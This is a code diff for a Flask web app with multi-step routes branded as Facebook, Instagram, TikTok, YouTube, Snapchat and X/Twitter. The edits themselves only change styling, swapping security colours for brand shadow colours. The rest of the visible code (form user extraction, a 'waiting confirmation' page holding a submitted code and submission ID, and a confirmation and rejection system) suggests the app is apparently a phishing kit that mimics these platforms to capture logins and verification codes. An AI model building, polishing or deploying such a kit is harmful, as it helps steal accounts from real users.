@@ -34,63 +34,55 @@ ICON_MAP = {
     "m1": ("fa-solid fa-circle-check", "#10B981", "Complete")
 }
 
-# ENHANCED: Platform to icon mapping with exact styling
-PLATFORM_ICON_MAP = {
+# ENHANCED: Platform mapping with exact CSS classes from your HTML
+PLATFORM_CLASS_MAP = {
     "Facebook": {
-        "icon": "fa-brands fa-facebook-f", 
+        "icon": "fa-brands fa-facebook",
         "color": "#1877F2",
         "bg_class": "bg-facebook",
-        "security_bg": "#f0f9ff",
-        "security_border": "#e0f2fe"
+        "shadow_color": "rgba(24,119,242,0.15)"
     },
     "Instagram": {
-        "icon": "fa-brands fa-instagram",
-        "color": "#E4405F", 
+        "icon": "fa-brands fa-instagram", 
+        "color": "#E4405F",
         "bg_class": "bg-instagram",
-        "security_bg": "#fdf2f8",
-        "security_border": "#fbcfe8"
+        "shadow_color": "rgba(221,42,123,0.15)"
     },
     "TikTok": {
         "icon": "fa-brands fa-tiktok",
         "color": "#000000",
-        "bg_class": "bg-tiktok", 
-        "security_bg": "#f8fafc",
-        "security_border": "#e2e8f0"
+        "bg_class": "bg-tiktok",
+        "shadow_color": "rgba(255, 0, 80, 0.15)"
     },
     "YouTube": {
         "icon": "fa-brands fa-youtube",
-        "color": "#FF0000",
+        "color": "#FF0000", 
         "bg_class": "bg-youtube",
-        "security_bg": "#fef2f2",
-        "security_border": "#fecaca"
+        "shadow_color": "rgba(255, 0, 0, 0.15)"
     },
     "Snapchat": {
         "icon": "fa-brands fa-snapchat",
-        "color": "#FFFC00", 
+        "color": "#FFFC00",
         "bg_class": "bg-snapchat",
-        "security_bg": "#fefce8",
-        "security_border": "#fef08a"
+        "shadow_color": "rgba(255,252,0,0.15)"
     },
     "X / Twitter": {
         "icon": "fa-brands fa-x-twitter",
         "color": "#000000",
-        "bg_class": "bg-twitter",
-        "security_bg": "#f8fafc", 
-        "security_border": "#e2e8f0"
+        "bg_class": "bg-twitter", 
+        "shadow_color": "rgba(29,161,242,0.15)"
     },
     "Twitter": {
         "icon": "fa-brands fa-x-twitter",
         "color": "#000000",
         "bg_class": "bg-twitter",
-        "security_bg": "#f8fafc",
-        "security_border": "#e2e8f0"
+        "shadow_color": "rgba(29,161,242,0.15)"
     },
     "Unknown": {
         "icon": "fa-solid fa-file",
         "color": "#666",
         "bg_class": "bg-twitter",
-        "security_bg": "#f8fafc",
-        "security_border": "#e2e8f0"
+        "shadow_color": "rgba(0,0,0,0.15)"
     }
 }
 
@@ -145,17 +137,17 @@ def extract_user(form):
             return val.strip()
     return "anonymous"
 
-# ENHANCED: Helper function to get platform details
+# ENHANCED: Helper function to get platform details with exact CSS classes
 def get_platform_details(platform_name):
-    return PLATFORM_ICON_MAP.get(platform_name, PLATFORM_ICON_MAP["Unknown"])
+    return PLATFORM_CLASS_MAP.get(platform_name, PLATFORM_CLASS_MAP["Unknown"])
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-# ENHANCED: Helper function to prepare waiting confirmation data
+# ENHANCED: Helper function to prepare waiting confirmation data with exact styling
 def get_waiting_confirmation_data(platform_name, next_url, code_value, submission_id):
-    """Helper function to prepare waiting confirmation data with proper platform styling"""
+    """Helper function to prepare waiting confirmation data with exact platform styling"""
     platform_data = get_platform_details(platform_name)
     return {
         'next_url': next_url,
@@ -165,11 +157,10 @@ def get_waiting_confirmation_data(platform_name, next_url, code_value, submissio
         'platform_name': platform_name,
         'platform_color': platform_data['color'],
         'platform_bg_class': platform_data['bg_class'],
-        'security_bg': platform_data['security_bg'],
-        'security_border': platform_data['security_border']
+        'platform_shadow_color': platform_data['shadow_color']
     }
 
-# TikTok Flow - ENHANCED
+# TikTok Flow - ENHANCED with exact styling
 @app.route('/joy1_1', methods=['GET','POST'])
 def joy1_1():
     if request.method == 'POST':
@@ -183,7 +174,8 @@ def joy1_1():
                          platform_icon=platform_data['icon'], 
                          platform_name='TikTok', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/joy1_2', methods=['GET','POST'])
 def joy1_2():
@@ -207,7 +199,8 @@ def joy1_2():
                          platform_icon=platform_data['icon'], 
                          platform_name='TikTok', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/joy1_3', methods=['GET','POST'])
 def joy1_3():
@@ -231,9 +224,10 @@ def joy1_3():
                          platform_icon=platform_data['icon'], 
                          platform_name='TikTok', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
-# YouTube Flow - ENHANCED
+# YouTube Flow - ENHANCED with exact styling
 @app.route('/joy2_1', methods=['GET','POST'])
 def joy2_1():
     if request.method == 'POST':
@@ -247,7 +241,8 @@ def joy2_1():
                          platform_icon=platform_data['icon'], 
                          platform_name='YouTube', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/joy2_2', methods=['GET','POST'])
 def joy2_2():
@@ -271,7 +266,8 @@ def joy2_2():
                          platform_icon=platform_data['icon'], 
                          platform_name='YouTube', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/joy2_3', methods=['GET','POST'])
 def joy2_3():
@@ -295,9 +291,10 @@ def joy2_3():
                          platform_icon=platform_data['icon'], 
                          platform_name='YouTube', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
-# Snapchat Flow - ENHANCED
+# Snapchat Flow - ENHANCED with exact styling
 @app.route('/happy1_1', methods=['GET','POST'])
 def happy1_1():
     if request.method == 'POST':
@@ -311,7 +308,8 @@ def happy1_1():
                          platform_icon=platform_data['icon'], 
                          platform_name='Snapchat', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/happy1_2', methods=['GET','POST'])
 def happy1_2():
@@ -335,7 +333,8 @@ def happy1_2():
                          platform_icon=platform_data['icon'], 
                          platform_name='Snapchat', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/happy1_3', methods=['GET','POST'])
 def happy1_3():
@@ -359,9 +358,10 @@ def happy1_3():
                          platform_icon=platform_data['icon'], 
                          platform_name='Snapchat', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
-# X/Twitter Flow - ENHANCED
+# X/Twitter Flow - ENHANCED with exact styling
 @app.route('/happy2_1', methods=['GET','POST'])
 def happy2_1():
     if request.method == 'POST':
@@ -375,7 +375,8 @@ def happy2_1():
                          platform_icon=platform_data['icon'], 
                          platform_name='X / Twitter', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/happy2_2', methods=['GET','POST'])
 def happy2_2():
@@ -399,7 +400,8 @@ def happy2_2():
                          platform_icon=platform_data['icon'], 
                          platform_name='X / Twitter', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/happy2_3', methods=['GET','POST'])
 def happy2_3():
@@ -423,9 +425,10 @@ def happy2_3():
                          platform_icon=platform_data['icon'], 
                          platform_name='X / Twitter', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
-# Facebook Flow - ENHANCED
+# Facebook Flow - ENHANCED with exact styling
 @app.route('/love1_1', methods=['GET','POST'])
 def love1_1():
     if request.method == 'POST':
@@ -439,7 +442,8 @@ def love1_1():
                          platform_icon=platform_data['icon'], 
                          platform_name='Facebook', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/love1_2', methods=['GET','POST'])
 def love1_2():
@@ -463,7 +467,8 @@ def love1_2():
                          platform_icon=platform_data['icon'], 
                          platform_name='Facebook', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/love1_3', methods=['GET','POST'])
 def love1_3():
@@ -487,9 +492,10 @@ def love1_3():
                          platform_icon=platform_data['icon'], 
                          platform_name='Facebook', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
-# Instagram Flow - ENHANCED
+# Instagram Flow - ENHANCED with exact styling
 @app.route('/love2_1', methods=['GET','POST'])
 def love2_1():
     if request.method == 'POST':
@@ -503,7 +509,8 @@ def love2_1():
                          platform_icon=platform_data['icon'], 
                          platform_name='Instagram', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/love2_2', methods=['GET','POST'])
 def love2_2():
@@ -527,7 +534,8 @@ def love2_2():
                          platform_icon=platform_data['icon'], 
                          platform_name='Instagram', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/love2_3', methods=['GET','POST'])
 def love2_3():
@@ -551,9 +559,10 @@ def love2_3():
                          platform_icon=platform_data['icon'], 
                          platform_name='Instagram', 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
-# Common Flow Pages - ENHANCED
+# Common Flow Pages - ENHANCED with exact styling
 @app.route('/spinner')
 def spinner():
     platform = request.args.get('platform', 'Unknown')
@@ -565,7 +574,8 @@ def spinner():
                          platform_icon=platform_data['icon'],
                          platform_name=platform,
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/f1', methods=['GET','POST'])
 def f1():
@@ -581,7 +591,8 @@ def f1():
                          platform_icon=platform_data['icon'], 
                          platform_name=platform, 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/f1_A', methods=['GET','POST'])
 def f1_A():
@@ -607,7 +618,8 @@ def f1_A():
                          platform_icon=platform_data['icon'], 
                          platform_name=platform, 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/spinner2')
 def spinner2():
@@ -620,7 +632,8 @@ def spinner2():
                          platform_icon=platform_data['icon'],
                          platform_name=platform,
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/f2', methods=['GET','POST'])
 def f2():
@@ -636,7 +649,8 @@ def f2():
                          platform_icon=platform_data['icon'], 
                          platform_name=platform, 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/f2_A', methods=['GET','POST'])
 def f2_A():
@@ -662,7 +676,8 @@ def f2_A():
                          platform_icon=platform_data['icon'], 
                          platform_name=platform, 
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 @app.route('/m1')
 def m1():
@@ -672,7 +687,8 @@ def m1():
                          platform_icon=platform_data['icon'],
                          platform_name=platform,
                          platform_color=platform_data['color'],
-                         platform_bg_class=platform_data['bg_class'])
+                         platform_bg_class=platform_data['bg_class'],
+                         platform_shadow_color=platform_data['shadow_color'])
 
 # ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========
 
